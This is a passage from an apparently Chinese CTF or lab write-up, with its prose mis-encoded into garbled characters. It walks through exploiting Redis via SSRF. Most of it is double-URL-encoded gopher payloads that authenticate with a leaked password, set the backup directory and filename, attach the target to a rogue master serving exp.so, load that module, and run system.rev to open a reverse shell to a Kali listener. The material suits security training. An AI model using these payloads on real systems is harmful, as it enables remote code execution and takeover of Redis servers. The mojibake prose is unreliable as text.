å’Œ4-4 ä¸€æ ·ï¼ æˆ‘è¿™å›æ˜¯è‡ªå·±å¤§è‡ªå·±ï¼ kaliçš„15000ç«¯å£å½“ä»æœºï¼

```
python3 redis_rogue_server.py -v -path exp.so
```

![Rifm5j.png](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923200505.jpeg)



#### **2ï¼‰ä¿®æ”¹å¤‡ä»½æ–‡ä»¶**

å‰é¢æç¤ºæ–‡ä»¶ä¸­ç»™å‡ºäº†Reidsçš„å¯†ç ï¼Œæˆæƒä¿®æ”¹å¤‡ä»½æ–‡ä»¶ç›®å½•

```
gopher://192.168.59.129:6380/_auth welcometowangdingbeissrfme6379
config set dir /tmp/
quit
```



```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250D%250Aquit%250D%250A
```



```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit

gopher://192.168.59.129:6380/_auth%20welcometowangdingbeissrfme6379%0D%0Aconfig%20set%20dir%20/tmp/%0D%0Aquit%0D%0A

gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250D%250Aquit%250D%250A
```

äºŒæ¬¡ç¼–ç å ç”¨notepad++ æŠŠ winä¸‹æ˜¯/r/n 

![image-20210923194440727](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923194440.png)

RESPæ”¯æŒçš„ä¹Ÿæ˜¯/R/N æ‰€ä»¥ç¬¬ä¸€æ¬¡urlç¼–ç å ï¼ æ›¿æ¢%0A ä¸º %0D%0A åœ¨è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aconfig%2520set%2520dir%2520/tmp/%250D%250Aquit%250D%250A
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250D%250Aquit%250D%250A
```

å°†ä»£ç åŠ åœ¨`url`åï¼Œè®¿é—®å›æ˜¾æ­£å¸¸å³å¯

![image-20210923194624508](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923194624.png)

![image-20210923194646614](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923194646.png)

#### **3ï¼‰è®¾ç½®å¤‡ä»½æ–‡ä»¶åå’Œä¸»ä»å¯¹è±¡**

```
gopher://192.168.59.129:6380/_auth welcometowangdingbeissrfme6379
config set dbfilename exp.so
slaveof 192.168.59.129 15000
quit

```

äºŒæ¬¡ç¼–ç å

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aconfig%2520set%2520dbfilename%2520exp.so%250D%250Aslaveof%2520192.168.59.129%252015000%250D%250Aquit%250D%250A
```

#### **4ï¼‰å¯¼å…¥æ¨¡å—**

```
gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379
module load ./exp.so
quit
```

äºŒæ¬¡ç¼–è¯‘

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Amodule%2520load%2520./exp.so%250D%250Aquit%250D%250A
```

![image-20210923200721739](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923200721.png)

æ¨¡å—å¯¼å…¥æˆåŠŸï¼

#### **5ï¼‰å…³é—­ä¸»ä»æ¨¡å¼**

```
gopher://192.168.59.129:6380/_auth welcometowangdingbeissrfme6379
slaveof NO ONE
quit
```

äºŒæ¬¡ç¼–ç 

![image-20210923200801730](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923200801.png)

![image-20210923200816198](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923200816.png)

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Aslaveof%2520NO%2520ONE%250D%250Aquit%250D%250A
```

![image-20210923200921309](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923200921.png)

å…³é—­æˆåŠŸï¼ expçš„å¤§æ¦‚æ„æ€ åº”è¯¥ä¼ªé€ ä¸€ä¸ª`redis`ä¸»æœºï¼ ç„¶åä¼ æ¶æ„æµé‡ï¼åœ¨é¶æœºé‡Œç”Ÿæˆ exp.so! å†åˆ©ç”¨so RCEï¼

#### **6ï¼‰å¯¼å‡ºæ•°æ®åº“**

```
gopher://192.168.59.129:6380/_auth welcometowangdingbeissrfme6379
config set dbfilename dump.rdb
save
quit
```

äºŒæ¬¡ç¼–ç  

```
gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit
```

è¿™ä¸ªå¯¼å‡ºçš„æ•°æ®åº“æ²¡æ‰¾åˆ° æ™•äº†ï¼ğŸ±â€ğŸ‘“ `oooo` æ²¡save!

![image-20210923203530137](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923203530.png)

#### **7ï¼‰åå¼¹shell**

éœ€è¦æå‰åœ¨kaliä¸Šå¼€å¯ç›‘å¬

```
gopher://192.168.59.129:6380/_auth welcometowangdingbeissrfme6379
system.rev 192.168.59.128 1
quit
```

äºŒæ¬¡ç¼–ç 

```
gopher://192.168.59.129:6380/_auth%2520welcometowangdingbeissrfme6379%250D%250Asystem.rev%2520192.168.59.128%25201%250D%250Aquit%250D%250A
```

![image-20210923203115986](https://gitee.com/taochiyu/blogimage/raw/master/img/20210923203116.png)



## æ–‡ç« ï¼š

`https://www.freebuf.com/vuls/277988.html`

`https://xz.aliyun.com/t/5665#toc-4`

